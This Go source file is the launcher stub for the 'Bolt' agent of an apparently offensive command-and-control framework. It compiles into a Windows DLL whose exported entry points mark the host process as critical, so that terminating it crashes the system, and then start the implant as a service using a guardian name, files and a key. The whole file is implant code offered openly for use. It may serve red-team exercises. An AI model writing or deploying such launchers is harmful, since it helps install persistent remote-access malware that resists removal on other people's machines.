//go:build windows
// +build windows

//
// Copyright (C) 2021 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
// ThunderStorm Bolt Agent Launcher Stub

package main

import "C"
import (
	"runtime/debug"
	"time"

	"github.com/iDigitalFlame/ThunderStorm/bolt"
	"github.com/iDigitalFlame/xmt/device/devtools"
)

func main() {}

//export boltMain
func boltMain() {
	defer func() {
		recover()
		devtools.SetCritical(false)
	}()
	debug.SetPanicOnFault(true)
	devtools.SetCritical(true)
	bolt.Service(time.Second*30, boltInit)
	devtools.SetCritical(false)
}

//export boltInit
func boltInit() {
	defer func() {
		recover()
	}()
	debug.SetPanicOnFault(true)
	bolt.Launch(boltGuardian, boltFiles, boltKey)
}
